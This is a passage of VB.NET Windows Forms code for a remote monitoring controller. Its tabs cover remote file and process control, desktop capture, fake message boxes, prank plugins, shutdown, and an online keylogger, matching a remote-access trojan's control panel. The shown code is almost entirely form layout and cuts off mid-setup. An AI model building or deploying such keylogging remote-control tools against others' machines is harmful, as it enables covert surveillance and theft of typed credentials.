

Imports WinMonitorBLIB_1_0

Public Class FrmWinMonitorControler : Inherits System.Windows.Forms.Form

#Region "Class variables"

    Private m_WinMessengerGeneric As CWinMonitorMessenger
    Private m_ServerConnectionGeneric As CTcpNetworkMonitorConnection
    Private m_CmdMonitorClientGeneric As CCommandMonitorClient

    Private m_ServerConnectionScreenMonitor As CTcpNetworkMonitorConnection
    Private m_WinMessengerScreenMonitor As CWinMonitorMessenger
    Private m_DesktopServer As CScreenMonitorBase
    Private m_DesktopClient As CScreenMonitorMessenger

    Private m_strUty As CStringUtility
    Private m_MainMemoryMonitor As CMainMemoryMonitor
    Private m_OsMonitor As COSMonitor
    Private m_frmExplorerFullView As FrmRemoteExplorer = Nothing
    Private m_usrcntrlFolderBrowser As usrctrlFolderBrowser = Nothing
    Private m_boolDisConnected As Boolean = False

    Private m_ServerPwd As String
    Private m_ServerIp As String
    Private m_ServerListenPort As Integer

    Private m_ChatClient As CChatClient
    Private m_ChatThrd As System.Threading.Thread
    Private m_blnMuxChat As Boolean

    Private m_OnLineKeyLogThread As System.Threading.Thread
    Private m_OnLineKeyLogger As COnLineKeyLoggerClient

#End Region

#Region " Windows Form Designer generated code "

    Public Sub New(ByVal ServerConnection As CTcpNetworkMonitorConnection, ByVal ServerPassword As String, ByVal ServerIP As String, ByVal ServerListenPort As Long)
        MyBase.New()


        'This call is required by the Windows Form Designer.
        InitializeComponent()

        Me.Tag = Nothing
        'Add any initialization after the InitializeComponent() call
        m_ServerPwd = ServerPassword
        m_ServerIp = ServerIP
        m_ServerListenPort = ServerListenPort

        m_ServerConnectionGeneric = ServerConnection
        m_WinMessengerGeneric = New CWinMonitorMessenger()
        m_WinMessengerGeneric.SetConnection(m_ServerConnectionGeneric)
        m_CmdMonitorClientGeneric = New CCommandMonitorClient(COMMAND_MONITOR_NULL_COMMAND, Nothing, COMMAND_MONITOR_COMPRESS_NIL)
        m_strUty = New CStringUtility()

        m_MainMemoryMonitor = New CMainMemoryMonitor()
        m_OsMonitor = New COSMonitor()
        m_usrcntrlFolderBrowser = New usrctrlFolderBrowser()
        Me.tabpgeServerToolRemoteExplorer.Controls.Add(m_usrcntrlFolderBrowser)
        m_usrcntrlFolderBrowser.Visible = True
        m_usrcntrlFolderBrowser.Font = New System.Drawing.Font("Courier New", 7, FontStyle.Regular)
        m_usrcntrlFolderBrowser.ForeColor = System.Drawing.Color.Black
        m_usrcntrlFolderBrowser.Dock = DockStyle.Fill
        m_ChatClient = Nothing
        m_ChatThrd = Nothing
        m_OnLineKeyLogThread = Nothing
    End Sub

    'Form overrides dispose to clean up the component list.
    Protected Overloads Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing Then
            If Not (components Is Nothing) Then
                components.Dispose()
            End If
        End If
        MyBase.Dispose(disposing)
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    Friend WithEvents lblWelcome As System.Windows.Forms.Label
    Friend WithEvents btnCancel As System.Windows.Forms.Button
    Friend WithEvents tabServerTools As System.Windows.Forms.TabControl
    Friend WithEvents tabpgeServerToolGeneralInfo As System.Windows.Forms.TabPage
    Friend WithEvents lblLine1 As System.Windows.Forms.Label
    Friend WithEvents lblComputerName As System.Windows.Forms.Label
    Friend WithEvents lblUserName As System.Windows.Forms.Label
    Friend WithEvents lblComputerNameTxt As System.Windows.Forms.Label
    Friend WithEvents lblUserNameTxt As System.Windows.Forms.Label
    Friend WithEvents lblLine2 As System.Windows.Forms.Label
    Friend WithEvents lblMainMemoryUsagetxt As System.Windows.Forms.Label
    Friend WithEvents lblMainMemoryUsage As System.Windows.Forms.Label
    Friend WithEvents lblTotalMainMemorytxt As System.Windows.Forms.Label
    Friend WithEvents lblTotalMainMemory As System.Windows.Forms.Label
    Friend WithEvents lblAvailableMainMemorytxt As System.Windows.Forms.Label
    Friend WithEvents lblAvailableMainMemory As System.Windows.Forms.Label
    Friend WithEvents lblTotalVirtualtxt As System.Windows.Forms.Label
    Friend WithEvents lblTotalVirtual As System.Windows.Forms.Label
    Friend WithEvents lblTotalAvilableVirtualtxt As System.Windows.Forms.Label
    Friend WithEvents lblTotalAvilableVirtual As System.Windows.Forms.Label
    Friend WithEvents tabpgeServerToolEnvmt As System.Windows.Forms.TabPage
    Friend WithEvents lblLine3 As System.Windows.Forms.Label
    Friend WithEvents lblOsExtratxt As System.Windows.Forms.Label
    Friend WithEvents lblOstxt As System.Windows.Forms.Label
    Friend WithEvents lblOsExtra As System.Windows.Forms.Label
    Friend WithEvents lblOs As System.Windows.Forms.Label
    Friend WithEvents lstwDrives As System.Windows.Forms.ListView
    Friend WithEvents imglstDriveIcons As System.Windows.Forms.ImageList
    Friend WithEvents cntxtmnuDriveExplorer As System.Windows.Forms.ContextMenu
    Friend WithEvents cntxtmnuDriveExplorerProperties As System.Windows.Forms.MenuItem
    Friend WithEvents tabpgeServerToolFakeMessenger As System.Windows.Forms.TabPage
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents rdobtnMsgExln As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnMsgInfo As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnMsgStop As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnMsgQstn As System.Windows.Forms.RadioButton
    Friend WithEvents lblMsgLevel As System.Windows.Forms.Label
    Friend WithEvents lblMsgCaption As System.Windows.Forms.Label
    Friend WithEvents lblMsgText As System.Windows.Forms.Label
    Friend WithEvents txtMsgCaption As System.Windows.Forms.TextBox
    Friend WithEvents txtMsgText As System.Windows.Forms.TextBox
    Friend WithEvents btnSend As System.Windows.Forms.Button
    Friend WithEvents tabpgeServerToolRemoteExplorer As System.Windows.Forms.TabPage
    Friend WithEvents cntxtmnuBigScreenMode As System.Windows.Forms.ContextMenu
    Friend WithEvents cntxtmnuBigScreenModeShowMaximized As System.Windows.Forms.MenuItem
    Friend WithEvents imglstIcon32x32 As System.Windows.Forms.ImageList
    Friend WithEvents tabpgeServerToolMiniDesktopViewer As System.Windows.Forms.TabPage
    Friend WithEvents picboxMiniDesktopViewer As System.Windows.Forms.PictureBox
    Friend WithEvents cntxtmnuMiniDesktopViewer As System.Windows.Forms.ContextMenu
    Friend WithEvents cntxtmnuMiniDesktopViewerRefresh As System.Windows.Forms.MenuItem
    Friend WithEvents lblDesktopRefreshWarning As System.Windows.Forms.Label
    Friend WithEvents cntxtmnuSeperator1 As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuMiniDesktopViewerSaveAsNormal As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuSeperator5 As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuMiniDesktopViewerToggleFullView As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuSeperator3 As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuMiniDesktopViewerLoadCompressedImage As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuSeperator4 As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuMiniDesktopViewerLoadNormalImage As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuSeperator6 As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuMiniDesktopViewerSaveAsCompressed As System.Windows.Forms.MenuItem
    Friend WithEvents savedlgImageFile As System.Windows.Forms.SaveFileDialog
    Friend WithEvents opendlgOpenImageFile As System.Windows.Forms.OpenFileDialog
    Friend WithEvents tabpgeServerToolProcessExplorer As System.Windows.Forms.TabPage
    Friend WithEvents lstwProcessList As System.Windows.Forms.ListView
    Friend WithEvents btnRefreshProcessList As System.Windows.Forms.Button
    Friend WithEvents cntxtmnuProcessExplorer As System.Windows.Forms.ContextMenu
    Friend WithEvents cntxtmnuProcessExplorerTerminateProcess As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuProcessExplorerMnuSeperator1 As System.Windows.Forms.MenuItem
    Friend WithEvents cntxtmnuProcessExplorerChangePriority As System.Windows.Forms.MenuItem
    Friend WithEvents tabpgeServerToolAdvanced As System.Windows.Forms.TabPage
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents gbxAdvancedIcon As System.Windows.Forms.GroupBox
    Friend WithEvents lblLine7 As System.Windows.Forms.Label
    Friend WithEvents lblLine4 As System.Windows.Forms.Label
    Friend WithEvents lblLine5 As System.Windows.Forms.Label
    Friend WithEvents btnAdvancedOk As System.Windows.Forms.Button
    Friend WithEvents rdobtnLoggOff As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnShutdown As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnPoweroff As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnRestart As System.Windows.Forms.RadioButton
    Friend WithEvents gbxAdvancedMode As System.Windows.Forms.GroupBox
    Friend WithEvents rdobtnAdvancedModeNormal As System.Windows.Forms.RadioButton
    Friend WithEvents rdobtnAdvancedModeImmediate As System.Windows.Forms.RadioButton
    Friend WithEvents tabpgeServerToolChatRoom As System.Windows.Forms.TabPage
    Friend WithEvents btnChatStartSession As System.Windows.Forms.Button
    Friend WithEvents txtChatClient As System.Windows.Forms.TextBox
    Friend WithEvents btnClearServer As System.Windows.Forms.Button
    Friend WithEvents btnChatExitSession As System.Windows.Forms.Button
    Friend WithEvents txtChatClientReadOnly As System.Windows.Forms.TextBox
    Friend WithEvents tabpgeServerToolClientOnlineKeyLogger As System.Windows.Forms.TabPage
    Friend WithEvents txtKeyLog As System.Windows.Forms.TextBox
    Friend WithEvents btnLoadOfflineKeyLog As System.Windows.Forms.Button
    Friend WithEvents chkboxEnableKeyLogging As System.Windows.Forms.CheckBox
    Friend WithEvents btnClearKeyLog As System.Windows.Forms.Button
    Friend WithEvents tabpgeServerToolFunPlugins As System.Windows.Forms.TabPage
    Friend WithEvents btnOpenOrCloseCDRom As System.Windows.Forms.Button
    Friend WithEvents btnFlashKeyBoard As System.Windows.Forms.Button
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.Resources.ResourceManager = New System.Resources.ResourceManager(GetType(FrmWinMonitorControler))
        Me.lblWelcome = New System.Windows.Forms.Label()
        Me.lblLine1 = New System.Windows.Forms.Label()
        Me.tabServerTools = New System.Windows.Forms.TabControl()
        Me.tabpgeServerToolGeneralInfo = New System.Windows.Forms.TabPage()
        Me.lblTotalAvilableVirtualtxt = New System.Windows.Forms.Label()
        Me.lblTotalAvilableVirtual = New System.Windows.Forms.Label()
        Me.lblTotalVirtualtxt = New System.Windows.Forms.Label()
        Me.lblTotalVirtual = New System.Windows.Forms.Label()
        Me.lblAvailableMainMemorytxt = New System.Windows.Forms.Label()
        Me.lblAvailableMainMemory = New System.Windows.Forms.Label()
        Me.lblTotalMainMemorytxt = New System.Windows.Forms.Label()
        Me.lblTotalMainMemory = New System.Windows.Forms.Label()
        Me.lblMainMemoryUsagetxt = New System.Windows.Forms.Label()
        Me.lblMainMemoryUsage = New System.Windows.Forms.Label()
        Me.lblLine2 = New System.Windows.Forms.Label()
        Me.lblUserNameTxt = New System.Windows.Forms.Label()
        Me.lblComputerNameTxt = New System.Windows.Forms.Label()
        Me.lblUserName = New System.Windows.Forms.Label()
        Me.lblComputerName = New System.Windows.Forms.Label()
        Me.tabpgeServerToolAdvanced = New System.Windows.Forms.TabPage()
        Me.btnAdvancedOk = New System.Windows.Forms.Button()
        Me.lblLine7 = New System.Windows.Forms.Label()
        Me.gbxAdvancedIcon = New System.Windows.Forms.GroupBox()
        Me.gbxAdvancedMode = New System.Windows.Forms.GroupBox()
        Me.rdobtnAdvancedModeImmediate = New System.Windows.Forms.RadioButton()
        Me.rdobtnAdvancedModeNormal = New System.Windows.Forms.RadioButton()
        Me.lblLine5 = New System.Windows.Forms.Label()
        Me.lblLine4 = New System.Windows.Forms.Label()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.rdobtnRestart = New System.Windows.Forms.RadioButton()
        Me.rdobtnPoweroff = New System.Windows.Forms.RadioButton()
        Me.rdobtnShutdown = New System.Windows.Forms.RadioButton()
        Me.rdobtnLoggOff = New System.Windows.Forms.RadioButton()
        Me.tabpgeServerToolProcessExplorer = New System.Windows.Forms.TabPage()
        Me.btnRefreshProcessList = New System.Windows.Forms.Button()
        Me.lstwProcessList = New System.Windows.Forms.ListView()
        Me.cntxtmnuProcessExplorer = New System.Windows.Forms.ContextMenu()
        Me.cntxtmnuProcessExplorerTerminateProcess = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuProcessExplorerMnuSeperator1 = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuProcessExplorerChangePriority = New System.Windows.Forms.MenuItem()
        Me.imglstDriveIcons = New System.Windows.Forms.ImageList(Me.components)
        Me.tabpgeServerToolMiniDesktopViewer = New System.Windows.Forms.TabPage()
        Me.lblDesktopRefreshWarning = New System.Windows.Forms.Label()
        Me.picboxMiniDesktopViewer = New System.Windows.Forms.PictureBox()
        Me.cntxtmnuMiniDesktopViewer = New System.Windows.Forms.ContextMenu()
        Me.cntxtmnuMiniDesktopViewerRefresh = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuSeperator1 = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuMiniDesktopViewerToggleFullView = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuSeperator3 = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuMiniDesktopViewerLoadNormalImage = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuSeperator4 = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuMiniDesktopViewerLoadCompressedImage = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuSeperator5 = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuMiniDesktopViewerSaveAsNormal = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuSeperator6 = New System.Windows.Forms.MenuItem()
        Me.cntxtmnuMiniDesktopViewerSaveAsCompressed = New System.Windows.Forms.MenuItem()
        Me.tabpgeServerToolFakeMessenger = New System.Windows.Forms.TabPage()
        Me.btnSend = New System.Windows.Forms.Button()
        Me.txtMsgText = New System.Windows.Forms.TextBox()
        Me.txtMsgCaption = New System.Windows.Forms.TextBox()
        Me.lblMsgText = New System.Windows.Forms.Label()
        Me.lblMsgCaption = New System.Windows.Forms.Label()
        Me.lblMsgLevel = New System.Windows.Forms.Label()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.rdobtnMsgExln = New System.Windows.Forms.RadioButton()
        Me.rdobtnMsgInfo = New System.Windows.Forms.RadioButton()
        Me.rdobtnMsgStop = New System.Windows.Forms.RadioButton()
        Me.rdobtnMsgQstn = New System.Windows.Forms.RadioButton()
        Me.tabpgeServerToolEnvmt = New System.Windows.Forms.TabPage()
        Me.lstwDrives = New System.Windows.Forms.ListView()
        Me.cntxtmnuDriveExplorer = New System.Windows.Forms.ContextMenu()
        Me.cntxtmnuDriveExplorerProperties = New System.Windows.Forms.MenuItem()
        Me.lblLine3 = New System.Windows.Forms.Label()
        Me.lblOsExtratxt = New System.Windows.Forms.Label()
        Me.lblOstxt = New System.Windows.Forms.Label()
        Me.lblOsExtra = New System.Windows.Forms.Label()
        Me.lblOs = New System.Windows.Forms.Label()
        Me.tabpgeServerToolChatRoom = New System.Windows.Forms.TabPage()
        Me.txtChatClientReadOnly = New System.Windows.Forms.TextBox()
        Me.btnClearServer = New System.Windows.Forms.Button()
        Me.btnChatExitSession = New System.Windows.Forms.Button()
        Me.btnChatStartSession = New System.Windows.Forms.Button()
        Me.txtChatClient = New System.Windows.Forms.TextBox()
        Me.tabpgeServerToolFunPlugins = New System.Windows.Forms.TabPage()
        Me.btnFlashKeyBoard = New System.Windows.Forms.Button()
        Me.btnOpenOrCloseCDRom = New System.Windows.Forms.Button()
        Me.tabpgeServerToolRemoteExplorer = New System.Windows.Forms.TabPage()
        Me.cntxtmnuBigScreenMode = New System.Windows.Forms.ContextMenu()
        Me.cntxtmnuBigScreenModeShowMaximized = New System.Windows.Forms.MenuItem()
        Me.tabpgeServerToolClientOnlineKeyLogger = New System.Windows.Forms.TabPage()
        Me.btnClearKeyLog = New System.Windows.Forms.Button()
        Me.chkboxEnableKeyLogging = New System.Windows.Forms.CheckBox()
        Me.btnLoadOfflineKeyLog = New System.Windows.Forms.Button()
        Me.txtKeyLog = New System.Windows.Forms.TextBox()
        Me.btnCancel = New System.Windows.Forms.Button()
        Me.imglstIcon32x32 = New System.Windows.Forms.ImageList(Me.components)
        Me.savedlgImageFile = New System.Windows.Forms.SaveFileDialog()
        Me.opendlgOpenImageFile = New System.Windows.Forms.OpenFileDialog()
        Me.tabServerTools.SuspendLayout()
        Me.tabpgeServerToolGeneralInfo.SuspendLayout()
        Me.tabpgeServerToolAdvanced.SuspendLayout()
        Me.gbxAdvancedIcon.SuspendLayout()
        Me.gbxAdvancedMode.SuspendLayout()
        Me.tabpgeServerToolProcessExplorer.SuspendLayout()
        Me.tabpgeServerToolMiniDesktopViewer.SuspendLayout()
        Me.tabpgeServerToolFakeMessenger.SuspendLayout()
        Me.Panel1.SuspendLayout()
        Me.tabpgeServerToolEnvmt.SuspendLayout()
        Me.tabpgeServerToolChatRoom.SuspendLayout()
        Me.tabpgeServerToolFunPlugins.SuspendLayout()
        Me.tabpgeServerToolClientOnlineKeyLogger.SuspendLayout()
        Me.SuspendLayout()
        '
        'lblWelcome
        '
        Me.lblWelcome.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblWelcome.Dock = System.Windows.Forms.DockStyle.Top
        Me.lblWelcome.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblWelcome.ForeColor = System.Drawing.Color.FromArgb(CType(0, Byte), CType(0, Byte), CType(192, Byte))
        Me.lblWelcome.Image = CType(resources.GetObject("lblWelcome.Image"), System.Drawing.Bitmap)
        Me.lblWelcome.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.lblWelcome.Name = "lblWelcome"
        Me.lblWelcome.Size = New System.Drawing.Size(478, 45)
        Me.lblWelcome.TabIndex = 0
        Me.lblWelcome.Text = "Label1"
        Me.lblWelcome.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'lblLine1
        '
        Me.lblLine1.BackColor = System.Drawing.Color.White
        Me.lblLine1.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblLine1.Dock = System.Windows.Forms.DockStyle.Top
        Me.lblLine1.Location = New System.Drawing.Point(0, 45)
        Me.lblLine1.Name = "lblLine1"
        Me.lblLine1.Size = New System.Drawing.Size(478, 3)
        Me.lblLine1.TabIndex = 1
        '
        'tabServerTools
        '
        Me.tabServerTools.Controls.AddRange(New System.Windows.Forms.Control() {Me.tabpgeServerToolGeneralInfo, Me.tabpgeServerToolEnvmt, Me.tabpgeServerToolRemoteExplorer, Me.tabpgeServerToolProcessExplorer, Me.tabpgeServerToolMiniDesktopViewer, Me.tabpgeServerToolFakeMessenger, Me.tabpgeServerToolChatRoom, Me.tabpgeServerToolFunPlugins, Me.tabpgeServerToolAdvanced, Me.tabpgeServerToolClientOnlineKeyLogger})
        Me.tabServerTools.Location = New System.Drawing.Point(8, 54)
        Me.tabServerTools.Multiline = True
        Me.tabServerTools.Name = "tabServerTools"
        Me.tabServerTools.SelectedIndex = 0
        Me.tabServerTools.Size = New System.Drawing.Size(462, 294)
        Me.tabServerTools.SizeMode = System.Windows.Forms.TabSizeMode.FillToRight
        Me.tabServerTools.TabIndex = 2
        '
        'tabpgeServerToolGeneralInfo
        '
        Me.tabpgeServerToolGeneralInfo.Controls.AddRange(New System.Windows.Forms.Control() {Me.lblTotalAvilableVirtualtxt, Me.lblTotalAvilableVirtual, Me.lblTotalVirtualtxt, Me.lblTotalVirtual, Me.lblAvailableMainMemorytxt, Me.lblAvailableMainMemory, Me.lblTotalMainMemorytxt, Me.lblTotalMainMemory, Me.lblMainMemoryUsagetxt, Me.lblMainMemoryUsage, Me.lblLine2, Me.lblUserNameTxt, Me.lblComputerNameTxt, Me.lblUserName, Me.lblComputerName})
        Me.tabpgeServerToolGeneralInfo.Location = New System.Drawing.Point(4, 40)
        Me.tabpgeServerToolGeneralInfo.Name = "tabpgeServerToolGeneralInfo"
        Me.tabpgeServerToolGeneralInfo.Size = New System.Drawing.Size(454, 250)
        Me.tabpgeServerToolGeneralInfo.TabIndex = 0
        Me.tabpgeServerToolGeneralInfo.Text = "General"
        '
        'lblTotalAvilableVirtualtxt
        '
        Me.lblTotalAvilableVirtualtxt.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblTotalAvilableVirtualtxt.Location = New System.Drawing.Point(110, 212)
        Me.lblTotalAvilableVirtualtxt.Name = "lblTotalAvilableVirtualtxt"
        Me.lblTotalAvilableVirtualtxt.Size = New System.Drawing.Size(330, 21)
        Me.lblTotalAvilableVirtualtxt.TabIndex = 14
        Me.lblTotalAvilableVirtualtxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblTotalAvilableVirtual
        '
        Me.lblTotalAvilableVirtual.Location = New System.Drawing.Point(14, 213)
        Me.lblTotalAvilableVirtual.Name = "lblTotalAvilableVirtual"
        Me.lblTotalAvilableVirtual.Size = New System.Drawing.Size(90, 21)
        Me.lblTotalAvilableVirtual.TabIndex = 13
        Me.lblTotalAvilableVirtual.Text = "Virtual available"
        Me.lblTotalAvilableVirtual.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblTotalVirtualtxt
        '
        Me.lblTotalVirtualtxt.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblTotalVirtualtxt.Location = New System.Drawing.Point(110, 183)
        Me.lblTotalVirtualtxt.Name = "lblTotalVirtualtxt"
        Me.lblTotalVirtualtxt.Size = New System.Drawing.Size(330, 21)
        Me.lblTotalVirtualtxt.TabIndex = 12
        Me.lblTotalVirtualtxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblTotalVirtual
        '
        Me.lblTotalVirtual.Location = New System.Drawing.Point(14, 183)
        Me.lblTotalVirtual.Name = "lblTotalVirtual"
        Me.lblTotalVirtual.Size = New System.Drawing.Size(90, 21)
        Me.lblTotalVirtual.TabIndex = 11
        Me.lblTotalVirtual.Text = "Virtual memory"
        Me.lblTotalVirtual.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblAvailableMainMemorytxt
        '
        Me.lblAvailableMainMemorytxt.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblAvailableMainMemorytxt.Location = New System.Drawing.Point(110, 153)
        Me.lblAvailableMainMemorytxt.Name = "lblAvailableMainMemorytxt"
        Me.lblAvailableMainMemorytxt.Size = New System.Drawing.Size(330, 21)
        Me.lblAvailableMainMemorytxt.TabIndex = 10
        Me.lblAvailableMainMemorytxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblAvailableMainMemory
        '
        Me.lblAvailableMainMemory.Location = New System.Drawing.Point(14, 153)
        Me.lblAvailableMainMemory.Name = "lblAvailableMainMemory"
        Me.lblAvailableMainMemory.Size = New System.Drawing.Size(90, 21)
        Me.lblAvailableMainMemory.TabIndex = 9
        Me.lblAvailableMainMemory.Text = "Avilable memory"
        Me.lblAvailableMainMemory.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblTotalMainMemorytxt
        '
        Me.lblTotalMainMemorytxt.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblTotalMainMemorytxt.Location = New System.Drawing.Point(110, 123)
        Me.lblTotalMainMemorytxt.Name = "lblTotalMainMemorytxt"
        Me.lblTotalMainMemorytxt.Size = New System.Drawing.Size(330, 21)
        Me.lblTotalMainMemorytxt.TabIndex = 8
        Me.lblTotalMainMemorytxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblTotalMainMemory
        '
        Me.lblTotalMainMemory.Location = New System.Drawing.Point(14, 123)
        Me.lblTotalMainMemory.Name = "lblTotalMainMemory"
        Me.lblTotalMainMemory.Size = New System.Drawing.Size(90, 21)
        Me.lblTotalMainMemory.TabIndex = 7
        Me.lblTotalMainMemory.Text = "Main memory"
        Me.lblTotalMainMemory.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblMainMemoryUsagetxt
        '
        Me.lblMainMemoryUsagetxt.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblMainMemoryUsagetxt.Location = New System.Drawing.Point(110, 96)
        Me.lblMainMemoryUsagetxt.Name = "lblMainMemoryUsagetxt"
        Me.lblMainMemoryUsagetxt.Size = New System.Drawing.Size(330, 21)
        Me.lblMainMemoryUsagetxt.TabIndex = 6
        Me.lblMainMemoryUsagetxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblMainMemoryUsage
        '
        Me.lblMainMemoryUsage.Location = New System.Drawing.Point(14, 96)
        Me.lblMainMemoryUsage.Name = "lblMainMemoryUsage"
        Me.lblMainMemoryUsage.Size = New System.Drawing.Size(90, 21)
        Me.lblMainMemoryUsage.TabIndex = 5
        Me.lblMainMemoryUsage.Text = "Memory usage"
        Me.lblMainMemoryUsage.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblLine2
        '
        Me.lblLine2.BackColor = System.Drawing.Color.White
        Me.lblLine2.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblLine2.Location = New System.Drawing.Point(15, 75)
        Me.lblLine2.Name = "lblLine2"
        Me.lblLine2.Size = New System.Drawing.Size(426, 3)
        Me.lblLine2.TabIndex = 4
        '
        'lblUserNameTxt
        '
        Me.lblUserNameTxt.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblUserNameTxt.Location = New System.Drawing.Point(111, 36)
        Me.lblUserNameTxt.Name = "lblUserNameTxt"
        Me.lblUserNameTxt.Size = New System.Drawing.Size(330, 21)
        Me.lblUserNameTxt.TabIndex = 3
        Me.lblUserNameTxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblComputerNameTxt
        '
        Me.lblComputerNameTxt.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblComputerNameTxt.Location = New System.Drawing.Point(111, 12)
        Me.lblComputerNameTxt.Name = "lblComputerNameTxt"
        Me.lblComputerNameTxt.Size = New System.Drawing.Size(330, 21)
        Me.lblComputerNameTxt.TabIndex = 2
        Me.lblComputerNameTxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblUserName
        '
        Me.lblUserName.Location = New System.Drawing.Point(15, 36)
        Me.lblUserName.Name = "lblUserName"
        Me.lblUserName.Size = New System.Drawing.Size(90, 21)
        Me.lblUserName.TabIndex = 1
        Me.lblUserName.Text = "Local user name"
        Me.lblUserName.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblComputerName
        '
        Me.lblComputerName.Location = New System.Drawing.Point(15, 12)
        Me.lblComputerName.Name = "lblComputerName"
        Me.lblComputerName.Size = New System.Drawing.Size(90, 21)
        Me.lblComputerName.TabIndex = 0
        Me.lblComputerName.Text = "Computer name"
        Me.lblComputerName.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'tabpgeServerToolAdvanced
        '
        Me.tabpgeServerToolAdvanced.Controls.AddRange(New System.Windows.Forms.Control() {Me.btnAdvancedOk, Me.lblLine7, Me.gbxAdvancedIcon})
        Me.tabpgeServerToolAdvanced.Location = New System.Drawing.Point(4, 40)
        Me.tabpgeServerToolAdvanced.Name = "tabpgeServerToolAdvanced"
        Me.tabpgeServerToolAdvanced.Size = New System.Drawing.Size(454, 250)
        Me.tabpgeServerToolAdvanced.TabIndex = 6
        Me.tabpgeServerToolAdvanced.Text = "Advanced"
        '
        'btnAdvancedOk
        '
        Me.btnAdvancedOk.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnAdvancedOk.Location = New System.Drawing.Point(361, 220)
        Me.btnAdvancedOk.Name = "btnAdvancedOk"
        Me.btnAdvancedOk.Size = New System.Drawing.Size(80, 20)
        Me.btnAdvancedOk.TabIndex = 10
        Me.btnAdvancedOk.Text = "&Ok"
        '
        'lblLine7
        '
        Me.lblLine7.BackColor = System.Drawing.Color.White
        Me.lblLine7.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblLine7.Location = New System.Drawing.Point(15, 204)
        Me.lblLine7.Name = "lblLine7"
        Me.lblLine7.Size = New System.Drawing.Size(426, 3)
        Me.lblLine7.TabIndex = 9
        '
        'gbxAdvancedIcon
        '
        Me.gbxAdvancedIcon.Controls.AddRange(New System.Windows.Forms.Control() {Me.gbxAdvancedMode, Me.lblLine5, Me.lblLine4, Me.PictureBox1, Me.rdobtnRestart, Me.rdobtnPoweroff, Me.rdobtnShutdown, Me.rdobtnLoggOff})
        Me.gbxAdvancedIcon.Location = New System.Drawing.Point(15, 12)
        Me.gbxAdvancedIcon.Name = "gbxAdvancedIcon"
        Me.gbxAdvancedIcon.Size = New System.Drawing.Size(426, 176)
        Me.gbxAdvancedIcon.TabIndex = 0
        Me.gbxAdvancedIcon.TabStop = False
        Me.gbxAdvancedIcon.Text = "Remote system advanced options"
        '
        'gbxAdvancedMode
        '
        Me.gbxAdvancedMode.Controls.AddRange(New System.Windows.Forms.Control() {Me.rdobtnAdvancedModeImmediate, Me.rdobtnAdvancedModeNormal})
        Me.gbxAdvancedMode.Location = New System.Drawing.Point(12, 96)
